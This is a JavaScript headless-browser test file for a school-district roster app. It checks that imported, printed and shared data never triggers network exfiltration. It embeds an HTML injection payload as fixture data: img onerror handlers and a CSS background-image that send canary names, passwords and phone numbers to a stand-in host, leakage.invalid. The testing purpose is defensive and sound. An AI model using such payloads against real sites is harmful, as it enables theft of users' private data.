const test = require('node:test');
const assert = require('node:assert/strict');
const { runInHeadlessChrome } = require('./helpers/headless-runner');

// 実ブラウザの file: 起動である。相対パスは同一配信元に相当する攻撃の代替であり、
// HTTP実配信、配信ヘッダー、外部サーバーによる受信、OS印刷・共有先の挙動は保証範囲外である。
// print は実処理が組み立てたDOMを捕捉し、share/clipboard はアプリが渡した値を捕捉する。
function leakagePreload() {
	window.__leakageViolations = [];
	document.addEventListener('securitypolicyviolation', event => {
		window.__leakageViolations.push({ directive: event.effectiveDirective, blocked: event.blockedURI });
	});
}

function prepareLeakage() {
	const roster = 'LEAKAGE_ROSTER_CANARY_74291';
	const password = 'LeakagePass74291!';
	const phone = '090-7823-6159';
	const secretQuery = `roster=${roster}&password=${password}&tel=${phone}`;
	const attack = `<img data-leakage-attack src="https://leakage.invalid/collect?${secretQuery}" onerror="window.__leakageExecuted=1;fetch('https://leakage.invalid/handler?${secretQuery}')"><img data-leakage-attack src="./__leakage_same_origin__?${secretQuery}"><style data-leakage-attack>.leakage{background-image:url('https://leakage.invalid/css?${secretQuery}')}</style>`;
	window.leakage = {
		roster, password, phone, attack,
		noAttackDOM() {
			assert.strictEqual(document.querySelectorAll('[data-leakage-attack]').length, 0, 'Imported strings never create attack elements');
			assert.strictEqual(window.__leakageExecuted, undefined, 'Imported event handlers never execute');
			assert.strictEqual(__leakageViolations.length, 0, 'Safe imported text never produces CSP violations');
		},
		async positiveControl(phase) {
			const image = new Image();
			image.src = `icons/icon-192.png?leakage-observer=${phase}`;
			document.body.appendChild(image);
			await image.decode();
			assert.ok(image.naturalWidth > 0, 'Network observer positive control is a real local image request');
			image.remove();
		},
		async importDistrict(intake) {
			await ui.mode('district');
			await ui.expand('district');
			ui.fill('#d-pass', password);
			ui.fill('#d-pass-confirm', password);
			const data = {
				district: '漏洩検査地区', han: '1班', hanList: ['1班'],
				officers: [{ role: '校外委員', lastName: attack, firstName: roster, tel: phone }],
				students: [{ grade: '3', class: '1', han: '1班', lastName: attack, firstName: roster, address: '101', tel: phone }],
				neighborhood: [{ role: '会長', lastName: attack, firstName: roster, tel: phone }]
			};
			const ciphertext = await encryptPayload(JSON.stringify(data), password);
			assert.ok(!ciphertext.includes(roster) && !ciphertext.includes(password), 'Real encrypted intake contains no plaintext roster or password');
			if (intake === 'file') {
				await ui.file('#d-file-in', ciphertext, 'hostile-district.txt');
			} else {
				await ui.click('#btn-load-district-paste');
				ui.fill('#d-paste-box', ciphertext);
				await ui.click('button[data-click="loadPastedTextToDistrict"]');
			}
			await ui.waitFor(() => currentDistrict.district === data.district && ui.element(intake === 'file' ? '#d-file-in' : '#d-paste-box').value === '', 'DOM intake completes and clears input');
			assert.strictEqual(ui.element('#students-tbody [data-field="lastName"]').value, attack, 'Actual imported roster input preserves hostile text');
			assert.strictEqual(JSON.parse(localStorage.getItem('kogai_district_v2')).students[0].lastName, attack, 'Accepted import is saved before real reload');
			this.noAttackDOM();
		},
		async printDistrict() {
			ui.capturePrints();
			await ui.click('[data-click="printSingleDistrictSelected"]');
			assert.strictEqual(__prints.length, 1, 'Fixed district print action invokes actual print pipeline');
			assert.ok(ui.element('#print-area').textContent.includes(attack), 'Printable roster preserves the complete hostile text');
			assert.ok(ui.element('#print-area').textContent.includes(roster), 'Printable roster includes the expected private name');
			this.noAttackDOM();
		},
		async shareUrls() {
			// 正常な共有要求である。個人データを意図して共有する地区提出機能とは別のアプリURL導線である。
			ui.fill('#d-pass', password);
			ui.fill('#d-pass-confirm', password);
			window.__leakageShares = [];
			Object.defineProperty(navigator, 'share', { configurable: true, value: async data => __leakageShares.push(data) });
			await ui.click('#btn-share-app');
			await ui.waitFor(() => __leakageShares.length === 1, 'Application URL passed to native share');
			await ui.mode('transfer');
			await ui.click('#btn-share-transfer-url');
			await ui.waitFor(() => __leakageShares.length === 2, 'Transfer URL passed to native share');
			assert.ok(__leakageShares[1].url.includes('?mode=transfer'), 'Transfer share retains the fixed mode parameter');
			ui.clipboard();
			Object.defineProperty(navigator, 'share', { configurable: true, value: undefined });
			await ui.click('#btn-share-transfer-url');
			await ui.waitFor(() => window.__copiedText, 'Transfer URL clipboard fallback completes');
			const shared = JSON.stringify([...__leakageShares, __copiedText]);
			for (const secret of [roster, password, phone, attack, 'BEGIN_DATA:']) {
				assert.ok(!shared.includes(secret) && !shared.includes(encodeURIComponent(secret)), 'App URL share excludes roster, password and encrypted submissions');
			}
			await ui.mode('district');
			await ui.expand('district');
		},
		async officialJson() {
			const config = {
				scheduleTitle: `TITLE:${attack}`, metaLocation: `LOCATION:${attack}`, metaHeaderMsg: `HEADER:${attack}`,
				metaFooterMsg: `FOOTER:${attack}`, metaContactMsg: `CONTACT:${attack}`,
				startDate: '2026-10-19', endDate: '2026-10-20',
				specials: `2026-10-19,ASSIGNEE:${attack},NOTE:${attack}`,
				members: 'EXTERNAL_MEMBERS_MUST_NOT_REPLACE_ROSTER'
			};
			await ui.file('#card-d-hata input[data-change="loadHataOfficialFile"]', JSON.stringify(config), 'hostile-official.json');
			await ui.waitFor(() => currentDistrict.hata.title === config.scheduleTitle && ui.element('#card-d-hata input[type="file"]').value === '', 'Official JSON file selection completes');
			assert.strictEqual(JSON.parse(localStorage.getItem('kogai_district_v2')).hata.headerMsg, config.metaHeaderMsg, 'Official JSON metadata is persisted');
			await this.printHata();
		},
		async printHata() {
			await ui.click('button[data-click="runAutoHataGeneration"]');
			assert.ok(currentDistrict.hata.members.includes(roster), 'Hata members are regenerated from the actual imported student roster');
			assert.ok(!currentDistrict.hata.members.includes('EXTERNAL_MEMBERS_MUST_NOT_REPLACE_ROSTER'), 'Official JSON members never replace the roster');
			const preview = ui.element('#hata-schedule-preview').textContent;
			const prefixes = ['TITLE', 'LOCATION', 'HEADER', 'FOOTER', 'CONTACT', 'ASSIGNEE', 'NOTE'];
			for (const prefix of prefixes) assert.ok(preview.includes(`${prefix}:${attack}`), `Actual preview preserves complete hostile ${prefix} text`);
			assert.strictEqual(hataCurrentSchedule[0].person, `ASSIGNEE:${attack}`, 'Special assignee preserves hostile text');
			assert.strictEqual(hataCurrentSchedule[0].note, `NOTE:${attack}`, 'Special note preserves hostile text');
			for (const [id, prefix] of [['hata-title', 'TITLE'], ['hata-location', 'LOCATION'], ['hata-header-msg', 'HEADER'], ['hata-footer-msg', 'FOOTER'], ['hata-contact-msg', 'CONTACT']]) {
				assert.strictEqual(ui.element(`#${id}`).value, `${prefix}:${attack}`, 'Official metadata remains unchanged in live controls');
			}
			let prints = 0;
			window.print = () => {
				prints++;
				const printed = ui.element('#hata-print-active-sheet').textContent;
				for (const prefix of prefixes) assert.ok(printed.includes(`${prefix}:${attack}`), `Real temporary Hata print sheet preserves complete hostile ${prefix} text`);
				this.noAttackDOM();
			};
			await ui.click('button[data-click="printHataSchedule"]');
			assert.strictEqual(prints, 1, 'Fixed Hata print action invokes actual print pipeline');
			assert.ok(!document.getElementById('hata-print-active-sheet'), 'Temporary print sheet is removed');
			this.noAttackDOM();
		}
	};
}

function leakageTest(name, fn, afterReload) {
	test(name, async () => {
		const out = await runInHeadlessChrome(fn, {
			observeNetwork: true, beforeLoad: leakagePreload, prepare: prepareLeakage, afterReload, timeoutMs: 30000
		});
		assert.equal(out.success, true, JSON.stringify({ fatal: out.fatal, errors: out.errors, failures: out.results.filter(result => !result.passed) }, null, 2));
		assert.deepEqual(out.errors, [], 'No uncaught browser errors');
		assert.ok(out.results.length > 0 && out.results.every(result => result.passed), 'Browser assertions execute and pass');
		for (const phase of ['initial', 'reloaded']) {
			assert.ok(out.requests.some(request => request.url.includes(`/icons/icon-192.png?leakage-observer=${phase}`)), `CDP Network observes positive control ${phase}`);
		}
		const observed = JSON.stringify(out.requests);
		for (const secret of ['LEAKAGE_ROSTER_CANARY_74291', 'LeakagePass74291!', '090-7823-6159']) {
			assert.ok(!observed.includes(secret) && !observed.includes(encodeURIComponent(secret)), 'Observed request URL, headers and body contain no private canary');
		}
		assert.ok(!out.requests.some(request => /leakage\.invalid|__leakage_same_origin__/.test(request.url)), 'No external or relative same-origin-equivalent attack request occurs');
	});
}

const afterDistrictReload = async () => {
	await ui.expand('district');
	assert.strictEqual(ui.element('#students-tbody [data-field="lastName"]').value, leakage.attack, 'Real reload restores imported hostile text');
	await leakage.positiveControl('reloaded');
	await leakage.printDistrict();
	await leakage.shareUrls();
};

leakageTest('Security leakage file: encrypted DOM file import, save, reload, print and app URL sharing (file origin)', async () => {
	await leakage.positiveControl('initial');
	await leakage.importDistrict('file');
	await leakage.printDistrict();
	await leakage.shareUrls();
}, afterDistrictReload);

leakageTest('Security leakage paste: encrypted DOM paste import, save, reload, print and app URL sharing (file origin)', async () => {
	await leakage.positiveControl('initial');
	await leakage.importDistrict('paste');
	await leakage.printDistrict();
	await leakage.shareUrls();
}, afterDistrictReload);

leakageTest('Security leakage official JSON: hostile metadata, assignee and note survive file import, save, reload and Hata printing (file origin)', async () => {
	await leakage.positiveControl('initial');
	await leakage.importDistrict('file');
	await leakage.officialJson();
}, async () => {
	await ui.expand('district');
	assert.strictEqual(currentDistrict.hata.title, `TITLE:${leakage.attack}`, 'Official JSON metadata survives real reload');
	await leakage.positiveControl('reloaded');
	await leakage.printHata();
});
